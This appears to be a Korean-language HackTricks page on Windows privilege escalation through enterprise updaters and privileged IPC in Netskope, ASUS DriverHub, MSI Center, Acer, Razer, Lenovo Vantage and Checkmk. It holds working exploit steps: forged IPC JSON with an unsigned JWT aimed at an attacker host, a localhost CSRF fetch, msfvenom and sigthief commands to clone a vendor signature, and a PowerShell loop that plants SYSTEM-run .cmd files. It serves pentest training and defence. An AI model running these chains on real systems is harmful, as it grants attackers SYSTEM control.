# 엔터프라이즈 자동 업데이트 프로그램 및 권한이 높은 IPC 악용 (예: Netskope, ASUS 및 MSI)

{{#include ../../banners/hacktricks-training.md}}

이 페이지에서는 낮은 진입 장벽의 IPC 인터페이스와 권한이 높은 업데이트 흐름을 노출하는 엔터프라이즈 엔드포인트 에이전트 및 업데이트 프로그램에서 발견된 Windows 로컬 권한 상승 체인을 일반화합니다. 대표적인 사례는 R129 미만의 Netskope Client for Windows(CVE-2025-0309)입니다. 낮은 권한의 사용자가 등록 절차를 공격자가 제어하는 서버로 유도한 뒤, 악성 MSI를 전달하면 SYSTEM 서비스가 이를 설치할 수 있습니다.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

비슷한 제품에서 재사용할 수 있는 주요 아이디어:
- 권한이 높은 서비스의 localhost IPC를 악용해 등록 또는 재구성을 공격자 서버로 유도합니다.
- 공급업체의 업데이트 엔드포인트를 구현하고, 악성 “서명된” 패키지를 전달하도록 Rogue Trusted Root CA를 제공한 뒤 업데이트 프로그램이 악성 패키지를 가리키게 합니다.
- 허술한 서명자 검사(CN allow-list), 선택적 digest 플래그, 느슨한 MSI 속성 검사를 우회합니다.
- IPC가 “암호화”된 경우 레지스트리에 저장된 누구나 읽을 수 있는 머신 식별자에서 키/IV를 도출합니다.
- 서비스가 이미지 경로/프로세스 이름으로 호출자를 제한한다면, allow-list에 있는 프로세스에 코드를 주입하거나 프로세스를 일시 중단 상태로 생성한 뒤 최소한의 스레드 컨텍스트 패치로 DLL을 로드합니다.

커스텀 로컬 TCP 서비스는 PIN이나 다른 애플리케이션 자격 증명을 요구하더라도 동일한 방식으로 신원 및 입력 경계를 검토해야 합니다. 리스너를 해당 프로세스 및 유효한 서비스 계정과 연결한 다음, 실제 배포된 바이너리/버전을 확인하고 호출자가 제어하는 필드가 고정 버퍼에 복사되거나 자식 프로세스 명령을 구성하는 데 사용되기 전에 길이 검사가 이뤄지는지 살펴보세요. [Microsoft의 버퍼 오버런 가이드](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns)는 권한이 높은 네이티브 코드에서 검증되지 않은 외부 입력이 위험한 이유를 설명합니다. loopback 리스너, 하드코딩된 자격 증명 또는 프로세스 이름만으로는 메모리 손상이나 SYSTEM 실행이 입증되지 않습니다. 도달 가능성, 권한 부여, 코드 경로 및 완화책은 각각 별도로 검토해야 합니다. 실행 중인 서비스에 충돌을 유발할 정도로 긴 입력을 보내는 대신, 일반적인 열거는 수동적으로 수행하세요.

---
## 1) localhost IPC를 통해 등록을 공격자 서버로 유도하기

많은 에이전트는 사용자 모드 UI 프로세스가 localhost TCP를 통해 JSON을 사용해 SYSTEM 서비스와 통신하는 구조로 배포됩니다.

Netskope에서 관찰된 구성:
- UI: stAgentUI (낮은 무결성) ↔ Service: stAgentSvc (SYSTEM)
- IPC 명령 ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

공격 흐름:
1) 백엔드 호스트(예: AddonUrl)를 제어하는 클레임이 포함된 JWT 등록 토큰을 만듭니다. 서명이 필요하지 않도록 alg=None을 사용합니다.
2) JWT와 테넌트 이름을 포함해 프로비저닝 명령을 호출하는 IPC 메시지를 전송합니다:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) 서비스가 등록/구성을 위해 사용자가 제어하는 rogue server에 요청을 보내기 시작합니다. 예:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

참고:
- 호출자 검증이 경로/이름 기반인 경우, 허용 목록에 있는 vendor binary에서 요청을 시작하세요(§4 참조).<sup>[[1]](#references)[[2]](#references)</sup>

### 네트워크에 노출된 관리 IPC

이 신뢰 경계가 항상 localhost로 제한되는 것은 아닙니다. 보고된 MyReport Updater 2.1.1 사례에서는 `LocalSystem` 서비스가 모든 인터페이스에서 수신 대기했고, 인증 없이 참조 호스트, 포트 및 작동 모드를 변경하는 gRPC 구성을 허용했습니다. 원격 공격을 수행하려면 리스너에 대한 네트워크 접근과 서비스에서 선택한 참조 대상으로 나가는 연결이 모두 필요했습니다. 이후 패키지 흐름이 파일 쓰기 경계를 넘을 수 있는지와는 별개로 이 두 가지를 각각 평가하세요.<sup>[[16]](#references)</sup>

---
## 2) 업데이트 채널을 하이재킹해 SYSTEM 권한으로 코드 실행

클라이언트가 사용자의 서버와 통신하면, 예상 엔드포인트를 구현하고 공격자 MSI로 유도합니다. 일반적인 순서는 다음과 같습니다.

1) /v2/config/org/clientconfig → 매우 짧은 updater 간격의 JSON 구성을 반환합니다. 예:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate를 반환합니다. 서비스는 이를 Local Machine Trusted Root store에 설치합니다.
3) /v2/checkupdate → 악성 MSI와 가짜 버전을 가리키는 metadata를 제공합니다.

실제 환경에서 흔히 볼 수 있는 검사를 우회하는 방법:
- Signer CN allow-list: 서비스는 Subject CN이 “netSkope Inc” 또는 “Netskope, Inc.”와 일치하는지만 확인할 수 있습니다. rogue CA로 해당 CN을 가진 leaf를 발급하고 MSI에 서명할 수 있습니다.
- CERT_DIGEST property: CERT_DIGEST라는 이름의 무해한 MSI property를 포함합니다. 설치 시 이를 검증하지 않습니다.
- Optional digest enforcement: config flag(예: check_msi_digest=false)를 설정하면 추가 cryptographic validation이 비활성화됩니다.

결과: SYSTEM 서비스가
C:\ProgramData\Netskope\stAgent\data\*.msi
에서 MSI를 설치하고 NT AUTHORITY\SYSTEM 권한으로 임의의 코드를 실행합니다.<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass에서 얻을 교훈: vendor가 업데이트 출처를 cryptographically authenticate하는 대신 소수의 “trusted” domain만 allow-list에 추가한다면, 여전히 트래픽을 조종할 수 있는 vendor 소유 redirector나 reverse proxy를 찾아보세요. Netskope의 경우, 공개된 후속 연구에 따르면 R129-era allow-list도 공격자가 제어하는 Azure App Service 콘텐츠를 proxy하는 `rproxy.goskope.com`을 통해 여전히 악용될 수 있었습니다. hostname allow-list는 신뢰 경계가 아니라 장애물 정도로만 여기세요.<sup>[[14]](#references)</sup>

또 다른 실패 유형은 **일관성은 있지만 인증되지 않은 package metadata**입니다. MyReport 사례에서 공격자가 제어하는 reference가 수정된 archive를 제공하고, 중간자가 vendor의 MD5 digest와 size 응답을 updater에 전달되기 전에 변경했습니다. 해당 값의 일치는 응답의 일관성을 확인한 것일 뿐 vendor 출처를 확인한 것이 아니므로, MD5 collision은 필요하지 않았습니다. 호출자가 설치 디렉터리를 지정할 수 있었기 때문에 권한이 높은 extraction 작업이 file-write 경계가 되었습니다. 그 결과 발생하는 DLL-loading primitive는 [임의의 file write를 DLL hijacking으로 연결하기](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack)에서 다룹니다.<sup>[[16]](#references)</sup>

---
## 3) 암호화된 IPC 요청 위조 (해당하는 경우)

R127부터 Netskope는 IPC JSON을 Base64처럼 보이는 encryptData field로 감쌌습니다. 분석 결과, AES에 사용하는 key/IV는 모든 사용자가 읽을 수 있는 registry 값에서 파생되었습니다:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

공격자는 암호화를 재현하고 일반 사용자 권한으로 유효한 암호화 명령을 보낼 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup> 일반적인 팁: agent가 갑자기 IPC를 “암호화”한다면, HKLM의 device ID, product GUID, install ID 등이 재료로 사용되는지 살펴보세요.

---
## 4) IPC caller allow-list 우회 (path/name 검사)

일부 서비스는 TCP connection의 PID를 확인하고 image path/name을 Program Files 아래에 있는 vendor binary allow-list와 비교해 peer를 인증하려고 합니다(예: stagentui.exe, bwansvc.exe, epdlp.exe).

실용적인 우회 방법 두 가지:
- allow-listed process(예: nsdiag.exe)에 DLL injection을 수행하고 그 내부에서 IPC를 proxy합니다.
- allow-listed binary를 suspended 상태로 실행하고 CreateRemoteThread 없이 proxy DLL을 bootstrap하여 driver가 적용하는 tamper 규칙을 충족합니다(§5 참조).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection 친화적인 injection: suspended process + NtContinue 패치

제품에는 보호 대상 process의 handle에서 위험한 권한을 제거하는 minifilter/OB callbacks driver(예: Stadrv)가 포함되는 경우가 많습니다:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME 권한 제거
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE 권한으로 제한

이 제약을 준수하는 신뢰할 수 있는 user-mode loader:
1) CREATE_SUSPENDED를 지정해 vendor binary를 CreateProcess합니다.
2) 여전히 허용되는 handle을 가져옵니다: process에는 PROCESS_VM_WRITE | PROCESS_VM_OPERATION, thread에는 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT(또는 알려진 RIP 위치의 코드를 패치한다면 THREAD_RESUME만)를 사용합니다.
3) ntdll!NtContinue(또는 초기에 매핑이 보장되는 다른 thunk)를 DLL 경로에서 LoadLibraryW를 호출한 뒤 돌아가는 작은 stub으로 덮어씁니다.
4) ResumeThread를 호출해 process 내부에서 stub을 실행하고 DLL을 로드합니다.

이미 보호 중인 process에 PROCESS_CREATE_THREAD 또는 PROCESS_SUSPEND_RESUME을 사용하지 않았으므로(직접 생성했으므로) driver의 정책을 준수합니다.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) 실용적인 도구
- NachoVPN (Netskope plugin)은 rogue CA 생성, 악성 MSI 서명, 필요한 endpoint 제공을 자동화합니다: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope는 임의의(선택적으로 AES-encrypted) IPC message를 구성하며, allow-listed binary에서 요청을 보내기 위한 suspended-process injection도 포함하는 custom IPC client입니다.<sup>[[4]](#references)</sup>

## 7) 알 수 없는 updater/IPC 표면을 빠르게 분류하는 workflow

새로운 endpoint agent나 motherboard “helper” suite를 조사할 때는, 다음과 같은 간단한 workflow만으로도 privesc 대상으로 유망한지 판단할 수 있습니다:<sup>[[6]](#references)</sup>

1) loopback listener를 열거하고 vendor process와 연결합니다:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) 후보 named pipes 열거:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) 플러그인 기반 IPC 서버에서 사용하는 레지스트리 기반 라우팅 데이터 수집:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) 먼저 user-mode client에서 endpoint 이름, JSON 키, command ID를 추출합니다. 패킹된 Electron/.NET 프런트엔드는 전체 schema를 자주 leak합니다.

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) 프로세스를 최종적으로 실행하는 코드 경로만 찾지 말고, 실제 신뢰 판정 조건을 찾아라:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

우선순위를 두고 살펴볼 패턴:
- `CryptQueryObject`로 인증서를 파싱하면서 `WinVerifyTrust`를 사용하지 않는다면, 보통 “인증서가 존재함”을 “인증서가 신뢰됨”으로 간주한 것입니다. 이를 통해 인증서를 복제하거나 가짜 signer를 사용하는 등의 공격이 가능할 수 있습니다.
- `Origin`, `Referer`, 다운로드 URL, 프로세스 이름 또는 signer CN에 대한 부분 문자열/접미사 검사는 인증이 아닙니다. `contains(".vendor.com")`은 공격자가 제어하는 유사 도메인으로 악용할 수 있는 경우가 많습니다.
- 권한이 낮은 GUI가 “파일을 신뢰할 수 있다”고 판단하고 SYSTEM broker가 그 결과를 소비하기만 한다면, 클라이언트 측 DLL/JS를 패치하거나 재구현하는 것만으로도 경계를 완전히 우회할 수 있습니다(Razer 스타일의 분리된 검증).
- broker가 payload를 `%TEMP%`/`C:\Windows\Temp`에 복사한 다음 해당 경로에서 검증하거나 예약한다면, 즉시 TOCTOU 교체 가능 시간대를 테스트하고 더 약한 검사를 수행하는 대체 `ExecuteTask()` 래퍼를 노출하는 인접 plugin 모듈도 확인하세요.<sup>[[6]](#references)</sup>

named pipe를 많이 사용하는 대상에서는 프로토콜을 깊이 분석하기 전에 PipeViewer를 사용해 취약한 DACL과 원격에서 접근 가능한 pipe를 빠르게 찾아볼 수 있습니다.<sup>[[11]](#references)</sup>

대상이 PID, 이미지 경로 또는 프로세스 이름만으로 호출자를 인증한다면, 이를 보안 경계가 아니라 작은 장애물로 간주하세요. 합법적인 client에 코드를 삽입하거나 허용 목록에 있는 프로세스에서 연결하면 서버의 검사를 통과하는 경우가 많습니다. 특히 named pipe의 경우, [client impersonation 및 pipe abuse에 관한 이 페이지](named-pipe-client-impersonation.md)에서 해당 기법을 자세히 다룹니다.

권한이 높은 **cleanup 또는 restore broker**의 경우, pipe ACL뿐 아니라 경로 신뢰 경계도 점검하세요. 서비스 실행 파일과 설치 디렉터리가 보호되어 있더라도, 권한이 더 낮은 호출자가 공유 디렉터리에서 restore 대상 경로를 선택하거나 준비된 백업 artifact의 이름을 바꿀 수 있습니다. 호출자가 restore 명령에 접근할 수 있는지, 정확히 지정된 준비 입력 파일이나 파일명을 수정할 수 있는지, broker가 더 높은 권한으로 실행되는지, 그리고 restore 작업이 실제로 선택한 보호 경로에 쓰는지를 각각 확인하세요. 쓰기 가능한 준비 디렉터리나 읽을 수 있는 pipe만으로는 임의의 권한 상승 쓰기가 가능하다고 단정할 수 없습니다. 대상 경로 매핑과 서비스 동작을 코드 검토하거나 통제된 테스트로 확인해야 합니다. 알 수 없는 cleanup 명령은 사용자 파일을 삭제할 수 있으므로 수동 열거 중에는 실행하지 마세요.

---
## 8) 공급업체 서명만으로 인증하는 모듈형 add-in broker (Lenovo Vantage 패턴)

주목할 만한 새로운 변형은 **signed-client RPC broker**입니다. 권한이 낮은 Lenovo 서명 데스크톱 프로세스가 SYSTEM 서비스와 통신하고, 서비스는 JSON 명령을 `%ProgramData%` 아래의 XML로 정의된 add-in 집합에 전달합니다. 허용된 서명 client 중 하나에서 코드 실행을 달성하면, 모든 `runas="system"` contract가 공격 표면에 포함됩니다.<sup>[[15]](#references)</sup>

Lenovo Vantage 연구에서 관찰된 가치가 높은 기법:
- **호출자가 공급업체 서명을 받았다는 이유로 신뢰하기**: 연구자들은 Lenovo 서명 EXE를 쓰기 가능한 디렉터리에 복사하고 DLL side-load(`profapi.dll`)를 충족해, 서비스가 이미 신뢰하는 client 내부에서 임의의 코드를 실행하여 인증된 컨텍스트에 도달했습니다.
- **Manifest를 기반으로 공격 표면 발견하기**: add-in은 `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 아래에 선언됩니다. 여러 contract가 `SYSTEM`으로 실행되므로, 해당 manifest를 열거하면 broker 자체를 역공학하는 것보다 실제 권한 상승 동작을 더 빠르게 찾을 수 있습니다.
- **인증된 채널 뒤에 있는 명령별 취약점**: 신뢰된 client 내부에 진입한 후, 공개된 연구에서는 update/install 동작의 path traversal 및 race condition, 권한이 높은 settings 데이터베이스의 raw-SQL 악용, 그리고 의도된 hive 외부에 쓰기를 가능하게 한 부분 문자열 기반 레지스트리 경로 검사를 발견했습니다.

대상에 대한 유용한 정찰:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

실무적인 요점: helper suite가 먼저 **caller process**를 인증한 다음 수십 개의 plugin/add-in 명령으로 dispatch하는 broker를 노출한다면, 정문 trust check를 우회한 것만으로 멈추지 마세요. manifest/contract table을 덤프하고 각 high-privilege verb를 개별적으로 fuzz하세요. 인증된 channel 뒤에는 보통 여러 second-stage 버그가 숨어 있습니다.

---
## 1) 권한이 높은 HTTP API를 대상으로 한 브라우저-to-localhost CSRF (ASUS DriverHub)

DriverHub는 127.0.0.1:53000에서 사용자 모드 HTTP 서비스(ADU.exe)를 실행하며, `https://driverhub.asus.com`에서 오는 브라우저 호출을 기대합니다. Origin 필터는 Origin header와 `/asus/v1.0/*`에서 제공되는 download URL에 대해 `string_contains(".asus.com")`만 수행합니다. 따라서 `https://driverhub.asus.com.attacker.tld` 같은 공격자 제어 host도 검사를 통과하며 JavaScript에서 상태를 변경하는 요청을 보낼 수 있습니다.<sup>[[6]](#references)</sup> 추가 우회 패턴은 [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)를 참조하세요.

실제 공격 흐름:
1) `.asus.com`을 포함하는 domain을 등록하고 그곳에 악성 웹페이지를 호스팅합니다.
2) `fetch` 또는 XHR을 사용해 `http://127.0.0.1:53000`의 권한이 높은 endpoint(예: `Reboot`, `UpdateApp`)를 호출합니다.
3) handler가 기대하는 JSON body를 전송합니다. 압축된 frontend JS에서 아래 schema를 확인할 수 있습니다.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

아래에 표시된 PowerShell CLI도 Origin 헤더를 신뢰된 값으로 스푸핑하면 성공합니다:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

공격자 사이트를 브라우저에서 방문하면 1-click(또는 `onload`를 통한 0-click) 로컬 CSRF가 발생해 SYSTEM helper를 구동합니다.

---
## 2) 안전하지 않은 code-signing 검증 및 인증서 복제 (ASUS UpdateApp)

`/asus/v1.0/UpdateApp`은 JSON 본문에 지정된 임의의 실행 파일을 다운로드하고 `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`에 캐시합니다. 다운로드 URL 검증에도 동일한 부분 문자열 로직을 재사용하므로 `http://updates.asus.com.attacker.tld:8000/payload.exe`가 허용됩니다. 다운로드 후 ADU.exe는 실행 전에 PE에 서명이 있는지와 Subject 문자열이 ASUS와 일치하는지만 확인합니다. `WinVerifyTrust`나 체인 검증은 수행하지 않습니다.

이 흐름을 악용하려면:
1) payload를 만듭니다(예: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS의 서명자를 payload에 복제합니다(예: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe`를 `.asus.com` 유사 도메인에서 호스팅하고 위의 브라우저 CSRF를 통해 UpdateApp을 트리거합니다.

Origin 및 URL 필터가 모두 부분 문자열 기반이고 서명자 검사는 문자열만 비교하므로, DriverHub는 공격자 바이너리를 가져와 높은 권한 컨텍스트에서 실행합니다.<sup>[[6]](#references)</sup>

---
## 1) 업데이터의 복사/실행 경로에서 TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center의 SYSTEM 서비스는 각 프레임이 `4-byte ComponentID || 8-byte CommandID || ASCII arguments`로 구성된 TCP 프로토콜을 제공합니다. 핵심 컴포넌트(Component ID `0f 27 00 00`)에는 `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`가 포함되어 있습니다. 핸들러는 다음 작업을 수행합니다.
1) 전달된 실행 파일을 `C:\Windows\Temp\MSI Center SDK.exe`에 복사합니다.
2) `CS_CommonAPI.EX_CA::Verify`를 통해 서명을 검증합니다(인증서 subject가 “MICRO-STAR INTERNATIONAL CO., LTD.”와 일치해야 하고 `WinVerifyTrust`가 성공해야 함).
3) 공격자가 제어하는 인수를 사용해 임시 파일을 SYSTEM으로 실행하는 예약 작업을 생성합니다.

검증과 `ExecuteTask()` 사이에 복사된 파일은 잠기지 않습니다. 공격자는 다음과 같이 할 수 있습니다.
- Frame A를 보내 MSI 서명 바이너리를 지정합니다(서명 검사를 통과하고 작업이 대기열에 등록되도록 보장).
- 검증이 끝난 직후 `MSI Center SDK.exe`를 덮어쓰도록 악성 payload를 지정한 반복적인 Frame B 메시지로 경합을 일으킵니다.

스케줄러가 실행되면 원본 파일이 검증되었음에도 덮어쓴 payload를 SYSTEM으로 실행합니다. 안정적으로 악용하려면 두 개의 goroutine/thread에서 TOCTOU 구간을 확보할 때까지 CMD_AutoUpdateSDK를 반복 전송합니다.<sup>[[6]](#references)</sup>

---
## 2) 사용자 지정 SYSTEM 수준 IPC 및 impersonation 악용 (MSI Center + Acer Control Centre)

### MSI Center TCP 명령 세트
- `MSI.CentralServer.exe`가 로드하는 모든 plugin/DLL에는 `HKLM\SOFTWARE\MSI\MSI_CentralServer`에 저장된 Component ID가 할당됩니다. 프레임의 첫 4바이트가 해당 컴포넌트를 선택하므로 공격자는 명령을 임의의 모듈로 라우팅할 수 있습니다.
- Plugin은 자체 task runner를 정의할 수 있습니다. `Support\API_Support.dll`은 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`을 노출하고 서명 검증 없이 `API_Support.EX_Task::ExecuteTask()`를 직접 호출합니다. 로컬 사용자라면 누구나 이를 `C:\Users\<user>\Desktop\payload.exe`로 지정해 확실하게 SYSTEM 실행을 얻을 수 있습니다.
- Wireshark로 loopback 트래픽을 스니핑하거나 dnSpy에서 .NET 바이너리를 계측하면 Component와 명령의 매핑을 빠르게 확인할 수 있습니다. 그런 다음 사용자 지정 Go/Python 클라이언트로 프레임을 재전송할 수 있습니다.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipe 및 impersonation 수준
- SYSTEM 권한의 `ACCSvc.exe`는 `\\.\pipe\treadstone_service_LightMode`를 노출하며, 해당 임의 ACL은 원격 클라이언트(예: `\\TARGET\pipe\treadstone_service_LightMode`)를 허용합니다. 파일 경로와 함께 명령 ID `7`을 보내면 서비스의 프로세스 생성 루틴이 호출됩니다.
- 클라이언트 라이브러리는 인수와 함께 magic terminator byte(113)를 직렬화합니다. Frida/`TsDotNetLib`를 사용한 동적 계측([Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)에서 계측 팁 참조)을 통해 네이티브 핸들러가 `CreateProcessAsUser`를 호출하기 전에 이 값을 `SECURITY_IMPERSONATION_LEVEL` 및 integrity SID에 매핑하는 것을 확인할 수 있습니다.
- 113(`0x71`)을 114(`0x72`)로 바꾸면 전체 SYSTEM token을 유지하고 높은 무결성 SID(`S-1-16-12288`)를 설정하는 일반 분기로 진입합니다. 따라서 생성된 바이너리는 로컬 및 시스템 간 환경 모두에서 제한 없는 SYSTEM으로 실행됩니다.
- 이를 노출된 설치 프로그램 플래그(`Setup.exe -nocheck`)와 결합하면 실험용 VM에서도 ACC를 설치하고 vendor 하드웨어 없이 pipe를 테스트할 수 있습니다.<sup>[[6]](#references)</sup>

이러한 IPC 버그는 localhost 서비스에서 상호 인증(ALPC SID, `ImpersonationLevel=Impersonation` 필터, token 필터링)을 적용해야 하는 이유와, 모든 모듈의 “임의 바이너리 실행” helper가 동일한 서명자 검증을 수행해야 하는 이유를 보여줍니다.

---
## 3) 취약한 user-mode 검증을 이용하는 COM/IPC “elevator” helper (Razer Synapse 4)

Razer Synapse 4는 이 계열에서 또 다른 유용한 패턴을 추가했습니다. 권한이 낮은 사용자가 COM helper에 `RzUtility.Elevator`를 통해 프로세스를 실행하도록 요청할 수 있으며, 신뢰 여부 판단은 권한 경계 내부에서 강력하게 적용되는 대신 user-mode DLL(`simple_service.dll`)에 위임됩니다.

관찰된 악용 경로:
- COM 객체 `RzUtility.Elevator`를 인스턴스화합니다.
- `LaunchProcessNoWait(<path>, "", 1)`을 호출해 권한 상승 실행을 요청합니다.
- 공개 PoC에서는 요청을 보내기 전에 `simple_service.dll` 내부의 PE 서명 검사를 패치로 비활성화하여 공격자가 선택한 임의의 실행 파일을 실행할 수 있게 합니다.<sup>[[6]](#references)[[10]](#references)</sup>

최소 PowerShell 호출:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

일반적인 요점: “helper” 제품군을 리버싱할 때 localhost TCP나 named pipes만 확인하고 끝내지 마세요. `Elevator`, `Launcher`, `Updater`, `Utility` 같은 이름의 COM 클래스를 확인한 다음, 권한이 높은 서비스가 대상 바이너리를 직접 검증하는지, 아니면 패치 가능한 user-mode 클라이언트 DLL이 계산한 결과를 단순히 신뢰하는지 확인하세요. 이 패턴은 Razer 외에도 일반화할 수 있습니다. 권한이 높은 broker가 권한이 낮은 쪽에서 받은 allow/deny 결정에 의존하는 분할 설계라면 privesc 공격 표면이 될 수 있습니다.


---
## MSI 복구 중 예측 가능한 임시 스크립트 실행 (Checkmk Agent / CVE-2024-0670)

일부 Windows 에이전트는 여전히 `C:\Windows\Temp`에 임시 `.cmd` 파일을 작성하고 이를 `SYSTEM` 권한으로 실행하는 방식으로 권한이 필요한 작업을 수행합니다. 파일명이 예측 가능하고 서비스가 기존 파일을 안전하게 다시 만들지 않는 경우, 권한이 낮은 사용자는 나중에 생성될 임시 파일을 **읽기 전용**으로 미리 만들어 권한이 높은 프로세스가 자체 스크립트 대신 공격자가 제어하는 콘텐츠를 실행하게 할 수 있습니다.

취약한 Checkmk Agent 빌드에서 관찰된 내용:
- 임시 파일 패턴: `cmk_all_<PID>_1.cmd`
- 영향을 받는 브랜치: `2.0.0`, `2.1.0`, `2.2.0`
- 트리거: 캐시된 에이전트 패키지의 MSI **복구**<sup>[[8]](#references)[[9]](#references)</sup>

실행 절차:
1. 현재 프로세스 ID 또는 실행 중인 에이전트 PID를 기준으로 현실적인 PID 범위를 추정합니다.
2. 짧은 **ASCII** `.cmd` 페이로드를 작성합니다 (`Set-Content -Encoding Ascii` 또는 `cmd.exe` 리디렉션 사용; 배치 파일에 UTF-16 PowerShell 출력을 사용하지 마세요).
3. 후보 범위 전체에 `C:\Windows\Temp\cmk_all_<PID>_1.cmd` 파일을 생성하고 각 파일을 읽기 전용으로 설정합니다.
4. 캐시된 MSI의 복구를 트리거해 권한이 높은 서비스가 임시 스크립트를 다시 생성한 다음 실행하도록 합니다.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

취약한 제품이 Windows Installer를 사용해 설치된 경우, 복구를 트리거하기 전에 `C:\Windows\Installer` 아래의 무작위 문자열처럼 보이는 캐시된 MSI를 제품 이름에 대응시킵니다:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

운영 참고 사항:
- `qwinsta`는 비대화형 WinRM shell에서 `msiexec /fa`가 실패할 때, 기존 데스크톱/연결 끊김 세션이 복구를 정상적으로 트리거할 수 있는지 파악하는 데 유용합니다.<sup>[[7]](#references)</sup>
- 이 패턴은 임시 스크립트를 everyone-writable 위치에 저장한 뒤 SYSTEM 권한으로 실행하는 다른 endpoint agent 및 updater에도 적용됩니다. 예측 가능한 이름, 배타적 생성 의미 체계의 부재, 필요할 때 트리거할 수 있는 복구/업데이트 흐름을 확인하세요.

### 대화형 installer 복구 및 권한이 높은 console

PDF24 Creator 11.15.1은 별도의 MSI 복구 위험을 보여 줍니다. 프린터 설치 custom action이 복구 중 SYSTEM 권한으로 보이는 console을 시작할 수 있습니다. 공급업체는 이 동작을 해결하기 위해 11.15.2에서 MSI installer를 변경했습니다. 이전 제품 버전은 triage를 위한 단서일 뿐입니다. 등록되었거나 접근 가능한 MSI 패키지, 이 사용자가 복구를 시작할 수 있는지, 취약한 custom action과 로그 파일 지연이 있는지, 대화형 데스크톱에서 console이 표시될 수 있는지 확인하세요. 보고된 지연에는 `faxPrnInst.log`에 대한 oplock이 사용되었습니다. 일반적인 파일 쓰기 권한만으로 접근 조건이 충족되는 것은 아닙니다. 비대화형 shell, 접근할 수 없는 패키지 또는 패치된 installer가 있으면 공격 체인이 끊길 수 있습니다. 이 문제는 `AlwaysInstallElevated`에 의존하지 않으며, 예측 가능한 임시 스크립트를 교체하는 방식과도 다릅니다.

---
## 취약한 updater 검증을 통한 원격 공급망 하이재킹(WinGUp / Notepad++)

